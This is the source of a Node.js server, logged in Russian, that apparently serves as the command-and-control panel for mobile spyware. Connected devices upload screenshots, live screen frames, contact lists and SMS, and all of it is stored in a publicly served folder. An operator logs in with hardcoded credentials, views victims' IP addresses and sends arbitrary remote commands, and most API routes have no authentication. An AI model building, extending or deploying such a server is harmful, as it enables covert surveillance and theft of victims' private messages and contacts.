const express = require('express');
const WebSocket = require('ws');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const http = require('http');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/screenshots', express.static(path.join(__dirname, 'public/screenshots')));

const SECRET = 'root';
const PASSWORD = 'rootsql123';
const devices = {};
const commandsHistory = {};
const deviceCodes = {};
const webClients = new Set();

const CODES_FILE = path.join(__dirname, 'codes.json');
if (fs.existsSync(CODES_FILE)) {
    const data = JSON.parse(fs.readFileSync(CODES_FILE));
    Object.assign(deviceCodes, data);
}

function saveCodes() {
    fs.writeFileSync(CODES_FILE, JSON.stringify(deviceCodes, null, 2));
}

function generateCode() {
    return Math.random().toString(36).substring(2, 8).toUpperCase();
}

function broadcastDevices() {
    const list = Object.keys(devices).map(code => ({
        code: code,
        name: devices[code].name,
        status: devices[code].status,
        ip: devices[code].ip,
        vpn: devices[code].vpn || false
    }));
    console.log('📡 Отправка списка устройств:', list.length);
    webClients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({ type: 'devices', devices: list }));
        }
    });
}

if (!fs.existsSync(path.join(__dirname, 'public/screenshots'))) {
    fs.mkdirSync(path.join(__dirname, 'public/screenshots'), { recursive: true });
}

wss.on('connection', (ws, req) => {
    let deviceName = null;
    let deviceCode = null;
    let isWeb = false;
    console.log('✅ WebSocket подключён');

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            console.log('📩 Получено:', data.type);

            if (data.type === 'auth') {
                if (data.password === PASSWORD && data.secret === SECRET) {
                    isWeb = true;
                    webClients.add(ws);
                    ws.send(JSON.stringify({ type: 'auth_success' }));
                    console.log('✅ Веб-клиент авторизован');
                    broadcastDevices();
                } else {
                    ws.send(JSON.stringify({ type: 'auth_fail' }));
                    ws.close();
                }
                return;
            }

            if (data.type === 'register') {
                if (data.secret !== SECRET) {
                    ws.send(JSON.stringify({ type: 'error' }));
                    ws.close();
                    return;
                }
                deviceName = data.name;
                if (!deviceCodes[deviceName]) {
                    deviceCodes[deviceName] = generateCode();
                    saveCodes();
                }
                deviceCode = deviceCodes[deviceName];
                devices[deviceCode] = {
                    ws: ws,
                    ip: req.socket.remoteAddress,
                    name: deviceName,
                    status: 'online',
                    vpn: data.vpn || false,
                    lastSeen: Date.now(),
                    code: deviceCode
                };
                if (!commandsHistory[deviceCode]) commandsHistory[deviceCode] = [];
                console.log(`📱 Устройство зарегистрировано: ${deviceName} (код: ${deviceCode})`);
                ws.send(JSON.stringify({ type: 'registered', status: 'ok', code: deviceCode }));
                broadcastDevices();
                return;
            }

            if (data.type === 'ping') {
                if (deviceCode) {
                    devices[deviceCode].lastSeen = Date.now();
                    devices[deviceCode].status = 'online';
                }
                ws.send(JSON.stringify({ type: 'pong' }));
                return;
            }

            if (data.type === 'screenshot') {
                if (deviceCode && data.image) {
                    const timestamp = Date.now();
                    let ext = 'png';
                    let base64Data = data.image;
                    if (data.image.startsWith('data:image/jpeg;base64,')) {
                        ext = 'jpg';
                        base64Data = data.image.replace(/^data:image\/jpeg;base64,/, '');
                    } else if (data.image.startsWith('data:image/png;base64,')) {
                        ext = 'png';
                        base64Data = data.image.replace(/^data:image\/png;base64,/, '');
                    } else {
                        base64Data = data.image;
                    }
                    const filename = `screenshot_${deviceCode}_${timestamp}.${ext}`;
                    const filepath = path.join(__dirname, 'public/screenshots', filename);
                    fs.writeFile(filepath, base64Data, 'base64', (err) => {
                        if (err) console.error('❌ Ошибка записи:', err);
                        else console.log(`📸 Скриншот сохранён: ${filename}`);
                    });
                    commandsHistory[deviceCode].push({ command: 'screenshot', time: timestamp, result: `/screenshots/${filename}` });
                    ws.send(JSON.stringify({ type: 'ack', command: 'screenshot', status: 'ok' }));
                    broadcastDevices();
                }
                return;
            }

            if (data.type === 'stream_frame') {
                if (deviceCode && data.image) {
                    wss.clients.forEach(client => {
                        if (client !== ws && client.readyState === WebSocket.OPEN) {
                            client.send(JSON.stringify({
                                type: 'stream_frame',
                                code: deviceCode,
                                image: data.image
                            }));
                        }
                    });
                }
                return;
            }

            if (data.type === 'contacts') {
                if (deviceCode && data.html) {
                    const timestamp = Date.now();
                    const filename = `contacts_${deviceCode}_${timestamp}.html`;
                    const filepath = path.join(__dirname, 'public/screenshots', filename);
                    fs.writeFile(filepath, data.html, (err) => {
                        if (err) console.error(err);
                        else console.log(`📄 Контакты сохранены: ${filename}`);
                    });
                    commandsHistory[deviceCode].push({ command: 'contacts', time: timestamp, result: `/screenshots/${filename}` });
                    broadcastDevices();
                }
                return;
            }

            if (data.type === 'sms') {
                if (deviceCode && data.html) {
                    const timestamp = Date.now();
                    const filename = `sms_${deviceCode}_${timestamp}.html`;
                    const filepath = path.join(__dirname, 'public/screenshots', filename);
                    fs.writeFile(filepath, data.html, (err) => {
                        if (err) console.error(err);
                        else console.log(`📄 SMS сохранены: ${filename}`);
                    });
                    commandsHistory[deviceCode].push({ command: 'sms', time: timestamp, result: `/screenshots/${filename}` });
                    broadcastDevices();
                }
                return;
            }
        } catch (e) {
            console.error('❌ Ошибка обработки:', e);
        }
    });

    ws.on('close', () => {
        if (isWeb) webClients.delete(ws);
        if (deviceCode && devices[deviceCode]) {
            devices[deviceCode].status = 'offline';
            broadcastDevices();
            console.log(`❌ Устройство отключилось: ${deviceCode}`);
        }
    });
});

app.post('/api/command', (req, res) => {
    const { code, command, params } = req.body;
    console.log(`📨 Команда для ${code}: ${command}`);
    if (!code || !devices[code]) {
        return res.status(404).json({ error: 'Устройство не найдено' });
    }
    const ws = devices[code].ws;
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        devices[code].status = 'offline';
        broadcastDevices();
        return res.status(500).json({ error: 'Соединение потеряно' });
    }
    const payload = { type: 'command', action: command };
    if (params) payload.params = params;
    ws.send(JSON.stringify(payload));
    commandsHistory[code].push({ command: command, time: Date.now(), result: 'отправлено' });
    res.json({ status: 'ok' });
});

app.get('/api/devices', (req, res) => {
    const list = Object.keys(devices).map(code => ({
        code: code,
        name: devices[code].name,
        status: devices[code].status,
        ip: devices[code].ip,
        vpn: devices[code].vpn || false
    }));
    res.json(list);
});

app.delete('/api/devices', (req, res) => {
    Object.keys(devices).forEach(key => {
        if (devices[key].ws) try { devices[key].ws.close(); } catch(e) {}
        delete devices[key];
    });
    res.json({ status: 'ok' });
});

app.get('/api/history/:code', (req, res) => {
    const code = req.params.code;
    if (commandsHistory[code]) res.json(commandsHistory[code]);
    else res.json([]);
});

app.delete('/api/history/:code', (req, res) => {
    if (commandsHistory[code]) commandsHistory[code] = [];
    res.json({ status: 'ok' });
});

app.post('/api/create', (req, res) => {
    const { name } = req.body;
    if (!name) return res.status(400).json({ error: 'Имя обязательно' });
    const code = generateCode();
    deviceCodes[name] = code;
    saveCodes();
    devices[code] = {
        ws: null,
        ip: 'manual',
        name: name,
        status: 'offline',
        vpn: false,
        lastSeen: Date.now(),
        code: code
    };
    commandsHistory[code] = [];
    broadcastDevices();
    res.json({ status: 'ok', code });
});

app.get('/api/media', (req, res) => {
    const dir = path.join(__dirname, 'public/screenshots');
    if (!fs.existsSync(dir)) return res.json([]);
    fs.readdir(dir, (err, files) => {
        if (err) return res.json([]);
        const list = files.map(f => {
            const stat = fs.statSync(path.join(dir, f));
            return {
                filename: f,
                url: `/screenshots/${f}`,
                timestamp: stat.mtimeMs
            };
        }).sort((a, b) => b.timestamp - a.timestamp);
        res.json(list);
    });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Сервер запущен на порту ${PORT}`);
});
